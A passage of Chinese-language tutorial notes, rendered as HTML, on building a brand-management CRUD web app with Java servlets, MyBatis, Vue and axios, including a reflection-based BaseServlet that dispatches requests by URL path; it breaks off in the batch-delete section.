+<h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><p>在<code>com.itheima.web</code>中创建<code>SelectAllServlet</code>可以使用Idea提供的模板创建自动继承<code>HttpServlet</code></p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
+<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;
+<span class="hljs-keyword">import</span> com.itheima.service.BrandService;
+<span class="hljs-keyword">import</span> jdk.nashorn.internal.ir.CallNode;
+
+<span class="hljs-keyword">import</span> javax.servlet.*;
+<span class="hljs-keyword">import</span> javax.servlet.http.*;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.*;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-meta">@WebServlet(value = &quot;/selectAllServlet&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SelectAllServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-comment">// 创建BrandService</span>
+    <span class="hljs-keyword">private</span> BrandService service = <span class="hljs-keyword">new</span> BrandService();
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+		<span class="hljs-comment">// 调用BrandService中的selectAll方法</span>
+        List&lt;Brand&gt; brandList = service.selectAll();
+        <span class="hljs-comment">// 将brand对象转换为json字符串</span>
+        String string = JSON.toJSONString(brandList);
+		<span class="hljs-comment">// 设置响应数据类型为json</span>
+        response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
+        <span class="hljs-comment">//响应数据</span>
+        response.getWriter().write(string);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        doGet(request, response);
+    &#125;
+&#125;
+</code></pre>
+
+
+
+<h4 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h4><p>前端需要在页面加载完毕后发送 ajax 请求，所以发送请求的逻辑应该放在 <code>mounted()</code> 钩子函数中。而响应回来的数据需要赋值给表格绑定的数据模型，从代码中可以看出表格绑定的数据模型是 <code>brandlist</code></p>
+<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--表格--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
+    &lt;el-table
+            :data=&quot;brandlist&quot;
+            style=&quot;width: 100%&quot;
+            :row-class-name=&quot;tableRowClassName&quot;
+            @selection-change=&quot;handleSelectionChange&quot;
+    &gt;</code></pre>
+
+<p>ajax请求为</p>
+<pre><code class="hljs javascript">methods:&#123;
+	<span class="hljs-function"><span class="hljs-title">selectAll</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+                axios(&#123;
+                    method: <span class="hljs-string">&#x27;GET&#x27;</span>,
+                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>
+                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+                    <span class="hljs-keyword">var</span> brandlist = response.data;
+                    _this.brandlist = brandlist;
+                &#125;)
+        &#125;
+    &#125;
+<span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span>&#123;
+    <span class="hljs-built_in">this</span>.selectAll;
+&#125;
+</code></pre>
+
+<h3 id="2-添加功能"><a href="#2-添加功能" class="headerlink" title="2.添加功能"></a>2.添加功能</h3><h4 id="需求分析-1"><a href="#需求分析-1" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
+<li>用户请求后台时需要携带数据，且为post请求，携带的数据类型为json类型</li>
+<li>后端服务器获取json数据后将其转换为Brand类型</li>
+<li>添加成功后响应前端</li>
+</ul>
+<h4 id="后端实现-1"><a href="#后端实现-1" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-1"><a href="#dao-1" class="headerlink" title="dao"></a>dao</h5><p>在<code>BrandMapper</code>中添加addBrand()方法</p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 添加</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addBrand</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre>
+
+<h5 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h5><p>在BrandService中实现addBrand()业务逻辑方法</p>
+<pre><code class="hljs java">  <span class="hljs-comment">/**</span>
+<span class="hljs-comment">   * 添加</span>
+<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> brand</span>
+<span class="hljs-comment">   */</span>
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addBrand</span><span class="hljs-params">(Brand brand)</span></span>&#123;
+      SqlSession sqlSession = sqlSessionFactory.openSession();
+      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+
+      mapper.addBrand(brand);
+<span class="hljs-comment">// 对数据库的增删改 记得提交事务</span>
+      sqlSession.commit();
+      sqlSession.close();
+  &#125;</code></pre>
+
+<h5 id="servlet-1"><a href="#servlet-1" class="headerlink" title="servlet"></a>servlet</h5><p>前端请求时携带json数据，<code>request.getParamter()</code>无法获取，需要使用获取请求体的方法<code>request.getReader()</code></p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
+<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;
+<span class="hljs-keyword">import</span> com.itheima.service.BrandService;
+
+<span class="hljs-keyword">import</span> javax.servlet.ServletException;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
+<span class="hljs-keyword">import</span> java.io.BufferedReader;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-meta">@WebServlet(value = &quot;/addServlet&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AddServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-keyword">private</span> BrandService service = <span class="hljs-keyword">new</span> BrandService();
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        <span class="hljs-comment">// getParamter无法获取json数据</span>
+        BufferedReader reader = request.getReader();
+        String line = reader.readLine();
+        System.out.println(line);
+        <span class="hljs-comment">// 将json数据转换为Brand对象</span>
+        Brand brand = JSON.parseObject(line, Brand.class);
+        System.out.println(brand);
+        service.addBrand(brand);
+
+		<span class="hljs-comment">// 返回的响应数据      </span>
+        response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        doGet(request, response);
+    &#125;
+&#125;</code></pre>
+
+<h4 id="前端实现-1"><a href="#前端实现-1" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="添加的对话框"><a href="#添加的对话框" class="headerlink" title="添加的对话框"></a>添加的对话框</h5><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330144307668.png" alt="image-20220330144307668"></p>
+<p>初始时该对话框为隐藏状态，其状态有<code>dialogVisible</code>控制，默认情况下为false</p>
+<pre><code class="hljs js">&lt;el-dialog
+        title=<span class="hljs-string">&quot;添加品牌&quot;</span>
+        :visible.sync=<span class="hljs-string">&quot;dialogVisible&quot;</span>
+        width=<span class="hljs-string">&quot;30%&quot;</span>
+        &gt;</code></pre>
+
+<p>当点击添加按钮时，将<code>dialogVisible</code>设置为<code>true</code>，对话框弹出，便可以编辑数据</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">plain</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = true&quot;</span>&gt;</span>新增<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>
+
+<h5 id="提交数据"><a href="#提交数据" class="headerlink" title="提交数据"></a>提交数据</h5><p>对话框实际上是一个form表单，该表单数据与<code>brand</code>模型绑定，所以请求后端时提交brand即可</p>
+<pre><code class="hljs js"><span class="hljs-keyword">new</span> Vue(&#123;
+	<span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span>&#123;
+	<span class="hljs-keyword">return</span> &#123;
+		<span class="hljs-comment">// 品牌模型数据</span>
+         brand: &#123;
+                    status: <span class="hljs-string">&#x27;&#x27;</span>,
+                    brandName: <span class="hljs-string">&#x27;&#x27;</span>,
+                    companyName: <span class="hljs-string">&#x27;&#x27;</span>,
+                    id:<span class="hljs-string">&quot;&quot;</span>,
+                    ordered:<span class="hljs-string">&quot;&quot;</span>,
+                    description:<span class="hljs-string">&quot;&quot;</span>
+                &#125;,
+	&#125;
+	&#125;
+&#125;)</code></pre>
+
+<p>提交和取消按钮</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addBrand&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
+<span class="hljs-comment">&lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = false&quot;</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>
+
+<p><code>addBrand</code></p>
+<pre><code class="hljs js"><span class="hljs-comment">// 添加数据</span>
+            <span class="hljs-function"><span class="hljs-title">addBrand</span>(<span class="hljs-params"></span>)</span>&#123;
+                <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+                <span class="hljs-built_in">this</span>.currentPage=<span class="hljs-number">1</span>
+                axios(&#123;
+                    method: <span class="hljs-string">&#x27;post&#x27;</span>,
+                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/add&#x27;</span>,
+                    data: brand = _this.brand
+                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+                    <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
+                    	<span class="hljs-comment">// 隐藏对话框</span>
+                        _this.dialogVisible = <span class="hljs-literal">false</span>;
+                        <span class="hljs-comment">// 重新加载全部数据</span>
+                        _this.selectAll();
+                        _this.msgbox(<span class="hljs-string">&quot;添加成功！&quot;</span>);
+                    &#125;
+                &#125;)
+            &#125;</code></pre>
+
+
+
+<h3 id="Servlet优化"><a href="#Servlet优化" class="headerlink" title="Servlet优化"></a>Servlet优化</h3><p>===Web 层的 Servlet 个数太多了，不利于管理和编写===</p>
+<p>通过之前的两个功能，我们发现每一个功能都需要定义一个 <code>servlet</code>，一个模块需要实现增删改查功能，就需要4个 <code>servlet</code>，模块一多就会造成<code>servlet</code> 泛滥。此时我们就想 <code>servlet</code> 能不能像 <code>service</code> 一样，一个模块只定义一个 <code>servlet</code>，而每一个功能只需要在该 <code>servlet</code> 中定义对应的方法。例如下面代码：</p>
+<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> </span>&#123;
+    <span class="hljs-comment">//查询所有</span>
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//添加数据</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+    
+     <span class="hljs-comment">//修改数据</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//删除删除</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+&#125;</code></pre>
+
+<p>而我们知道发送请求 <code>servlet</code>，<code>tomcat</code> 会自动的调用 <code>service()</code> 方法，之前我们在自定义的 <code>servlet</code> 中重写 <code>doGet()</code> 方法和 <code>doPost()</code> 方法，当我们访问该 <code>servlet</code> 时会根据请求方式将请求分发给 <code>doGet()</code> 或者 <code>doPost()</code>  方法</p>
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826184103210.png" alt="image-20210826184103210" style="zoom:80%;">
+
+<p>那么我们也可以仿照这样请求分发的思想，在 <code>service()</code> 方法中根据具体的操作调用对应的方法，如：查询所有就调用 <code>selectAll()</code> 方法，添加企业信息就调用 <code>add()</code> 方法。</p>
+<p>为了做到通用，我们定义一个通用的 <code>servlet</code> 类，在定义其他的 <code>servlet</code> 是不需要继承 <code>HttpServlet</code>，而继承我们定义的 <code>BaseServlet</code>，在<code>BaseServlet</code> 中调用具体 <code>servlet</code>（如<code>BrandServlet</code>）中的对应方法。</p>
+<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        <span class="hljs-comment">//进行请求的分发</span>
+    &#125;
+&#125;</code></pre>
+
+<p><code>BrandServlet</code> 定义就需要修改为如下：</p>
+<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseServlet</span> </span>&#123;
+    <span class="hljs-comment">//用户实现分页查询</span>
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(...)</span> </span>&#123;&#125; 
+    
+    <span class="hljs-comment">//添加企业信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//修改企业信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//删除企业信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(...)</span> </span>&#123;&#125;
+&#125;</code></pre>
+
+<p>那么如何在 <code>BaseServlet</code> 中调用对应的方法呢？比如查询所有就调用 <code>selectAll()</code> 方法。</p>
+<p>可以==规定在发送请求时，请求资源的二级路径（/brandServlet/selectAll）和需要调用的方法名相同==，如：</p>
+<p>查询所有数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/selectAll</code></p>
+<p>添加数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/add</code></p>
+<p>修改数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/update</code></p>
+<p>删除数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/delete</code></p>
+<p>这样的话，在 <code>BaseServlet</code> 中就需要获取到资源的二级路径作为方法名，然后调用该方法</p>
+<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        <span class="hljs-comment">//1. 获取请求路径</span>
+        String uri = req.getRequestURI(); <span class="hljs-comment">// 例如路径为：/brand-case/brand/selectAll</span>
+        <span class="hljs-comment">//2. 获取最后一段路径，方法名</span>
+        <span class="hljs-keyword">int</span> index = uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);
+        String methodName = uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  获取到资源的二级路径  selectAll</span>
+
+        <span class="hljs-comment">//2. 执行方法</span>
+        <span class="hljs-comment">//2.1 获取BrandServlet /UserServlet 字节码对象 Class</span>
+        <span class="hljs-comment">//System.out.println(this);</span>
+
+        Class&lt;? extends BaseServlet&gt; cls = <span class="hljs-keyword">this</span>.getClass();
+        <span class="hljs-comment">//2.2 获取方法 Method对象</span>
+        <span class="hljs-keyword">try</span> &#123;
+            Method method = cls.getMethod(methodName,？？？);
+            <span class="hljs-comment">//4,调用该方法</span>
+            method.invoke(<span class="hljs-keyword">this</span>,？？？);
+        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
+            e.printStackTrace();
+        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
+            e.printStackTrace();
+        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>通过上面代码发现根据方法名获取对应方法的 <code>Method</code> 对象时需要指定方法参数的字节码对象。解决这个问题，可以将方法的参数类型规定死，而方法中可能需要用到 <code>request</code> 对象和 <code>response</code> 对象，所以指定方法的参数为 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code>，那么 <code>BrandServlet</code> 代码就可以改进为：</p>
+<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseServlet</span> </span>&#123;
+    <span class="hljs-comment">//用户实现分页查询</span>
+	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectAll</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//添加企业信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//修改企业信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
+    
+    <span class="hljs-comment">//删除企业信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;&#125;
+&#125;</code></pre>
+
+<p>BaseServlet代码可以改进为：</p>
+<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+
+    <span class="hljs-comment">//根据请求的最后一段路径来进行方法分发</span>
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        <span class="hljs-comment">//1. 获取请求路径</span>
+        String uri = req.getRequestURI(); <span class="hljs-comment">// 例如路径为：/brand-case/brand/selectAll</span>
+        <span class="hljs-comment">//2. 获取最后一段路径，方法名</span>
+        <span class="hljs-keyword">int</span> index = uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);
+        String methodName = uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  获取到资源的二级路径  selectAll   </span>
+
+        <span class="hljs-comment">//2. 执行方法</span>
+        <span class="hljs-comment">//2.1 获取BrandServlet /UserServlet 字节码对象 Class</span>
+        <span class="hljs-comment">//System.out.println(this);</span>
+
+        Class&lt;? extends BaseServlet&gt; cls = <span class="hljs-keyword">this</span>.getClass();
+        <span class="hljs-comment">//2.2 获取方法 Method对象</span>
+        <span class="hljs-keyword">try</span> &#123;   
+            Method method = cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class);
+            <span class="hljs-comment">//2.3 执行方法</span>
+            method.invoke(<span class="hljs-keyword">this</span>,req,resp);
+        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
+            e.printStackTrace();
+        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
+            e.printStackTrace();
+        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>前端需要改只有几个访问路径，这里不做具体实现</p>
+<h3 id="3-批量删除"><a href="#3-批量删除" class="headerlink" title="3.批量删除"></a>3.批量删除</h3><h4 id="需求分析-2"><a href="#需求分析-2" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
+<li>批量删除请求，携带参数为<code>[1,2,3...]</code>类型的json字符串</li>
+<li>后端接收到json字符串后需要将其转为int数组</li>
+<li>调用BrandService中的方法删除数据</li>
+</ul>
+<h4 id="后端实现-2"><a href="#后端实现-2" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-2"><a href="#dao-2" class="headerlink" title="dao"></a>dao</h5><p><code>BrandMapper</code>中添加<code>deleteByIds()</code>方法</p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 批量删除</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;ids&quot;)</span> <span class="hljs-keyword">int</span>[] ids)</span></span>;</code></pre>
+
+<h5 id="service-2"><a href="#service-2" class="headerlink" title="service"></a>service</h5><p>在<code>BrandService</code>中实现批量删除的业务逻辑代码</p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 批量删除</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] ids)</span></span>&#123;
+    SqlSession sqlSession = sqlSessionFactory.openSession();
+    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+    mapper.deleteByIds(ids);
+    sqlSession.commit();
+    sqlSession.close();
+
+&#125;</code></pre>
+
+<h5 id="servlet-2"><a href="#servlet-2" class="headerlink" title="servlet"></a>servlet</h5><p><code>src/main/java/com/itheima/web/servlet</code>的<code>BrandServlet</code>添加<code>deleteByIds</code>方法</p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 批量删除操作</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteByIds</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+
+    BufferedReader reader = request.getReader();
+    <span class="hljs-comment">// 获取json字符串</span>
+    String line = reader.readLine();
+    System.out.println(line);
+    <span class="hljs-keyword">int</span>[] ids = JSON.parseObject(line, <span class="hljs-keyword">int</span>[].class);
+    System.out.println(ids);
+
+    service.deleteByIds(ids);
+    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
+
+&#125;</code></pre>
+
+<h4 id="前端实现-2"><a href="#前端实现-2" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取选中数据的id值"><a href="#获取选中数据的id值" class="headerlink" title="获取选中数据的id值"></a>获取选中数据的id值</h5><p><code>handleSelectionChange</code></p>
+<pre><code class="hljs html">&lt;el-table
+                :data=&quot;brandlist&quot;
+                style=&quot;width: 100%&quot;
+                :row-class-name=&quot;tableRowClassName&quot;
+                @selection-change=&quot;handleSelectionChange&quot;
+        &gt;</code></pre>
+
+<p>可以看到当数据被选中后，<code>multipleSelection</code>会存放被选择的数据对象</p>
+<pre><code class="hljs js"><span class="hljs-comment">// 复选框选中后执行的方法</span>
+            <span class="hljs-function"><span class="hljs-title">handleSelectionChange</span>(<span class="hljs-params">val</span>)</span> &#123;
+                <span class="hljs-built_in">this</span>.multipleSelection = val;
+
+                <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.multipleSelection)
+                <span class="hljs-comment">// console.log(this.multipleSelection)</span>
+            &#125;,</code></pre>
+
+<p>而我们所需要的只是对象的id值，因此需要遍历<code>multipleSelection</code>获取id值</p>
+<pre><code class="hljs js"><span class="hljs-comment">// 从_this.multipleSelection获取brand的id值</span>
+                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.multipleSelection.length;i++)&#123;
+                        <span class="hljs-keyword">let</span> selectItem = _this.multipleSelection[i];
+                        _this.selectedIds[i] = selectItem.id;
+                    &#125;</code></pre>
+
+<h5 id="批量删除提示"><a href="#批量删除提示" class="headerlink" title="批量删除提示"></a>批量删除提示</h5><p>删除操作一般比较危险因此需要让用户确认是否删除，在element-ui中找到<code>$confirm</code>组件实现该功能</p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">deleteByIds</span>(<span class="hljs-params"></span>)</span>&#123;
+              <span class="hljs-built_in">this</span>.$confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>, <span class="hljs-string">&#x27;确认信息&#x27;</span>, &#123;
+                  distinguishCancelAndClose: <span class="hljs-literal">true</span>,
+                  confirmButtonText: <span class="hljs-string">&#x27;确定&#x27;</span>,
+                  cancelButtonText: <span class="hljs-string">&#x27;取消&#x27;</span>
+              &#125;).then(<span class="hljs-function">() =&gt;</span> &#123;
+                  <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+                  <span class="hljs-comment">// 从_this.multipleSelection获取brand的id值</span>
+                  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.multipleSelection.length;i++)&#123;
+                      <span class="hljs-keyword">let</span> selectItem = _this.multipleSelection[i];
+                      _this.selectedIds[i] = selectItem.id;
+                  &#125;
+                  axios(&#123;
+                      method: <span class="hljs-string">&#x27;post&#x27;</span>,
+                      url:<span class="hljs-string">&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;</span>,
+                      data: _this.selectedIds
